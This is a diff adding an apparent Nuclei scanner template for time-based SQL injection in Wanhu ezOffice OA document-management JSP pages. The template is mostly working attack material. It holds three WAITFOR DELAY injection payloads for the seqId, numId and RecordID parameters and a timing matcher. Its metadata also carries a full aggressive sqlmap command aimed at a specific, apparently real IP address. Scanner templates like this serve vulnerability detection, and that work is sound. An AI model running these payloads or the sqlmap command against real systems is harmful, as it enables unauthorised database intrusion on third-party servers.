@@ -1,0 +1,40 @@
+id: wanhu-ezoffice-govdocumentmanager-sqli
+info:
+  name: 万户 ezoffice govdocumentmanager_judge.jsp & govdocumentmanager_judge_seq.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/Akityo/cncs-armory-ktrimisu/blob/d01419ed32d0e0e2f60fae5352dedc766f62a3a6/pocs/cms/%E4%B8%87%E6%88%B7OA/WHIR_0012.py#L16
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: demo
+    hunter-query: demo
+    tips: old vuln
+    repair:
+    sqlmap: sqlmap -u "http://223.76.137.13:7001/defaultroot/govezoffice/gov_documentmanager/jigeObj.jsp?RecordID=1" -p RecordID --batch --risk 3 --level 5 --tamper=space2comment --dbms=mssql
+    version:
+  tags: 2015,wanhu,oa,sqli,time,ezoffice
+
+http:
+  - raw: 
+      - |+
+        @timeout: 15s
+        GET {{exp}} HTTP/1.1
+        Host: {{Hostname}}
+    
+    payloads:
+      exp:
+        - "/defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge_seq.jsp?seqId=1;WAITFOR%20DELAY%20'0:0:6'--"
+        - "/defaultroot/govezoffice/gov_documentmanager/govdocumentmanager_judge.jsp?numId=1;WAITFOR%20DELAY%20'0:0:6'--"
+        - "/defaultroot/govezoffice/gov_documentmanager/jigeObj.jsp?RecordID=1';WAITFOR%20DELAY%20'0:0:6'--"
+    
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'defaultroot')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
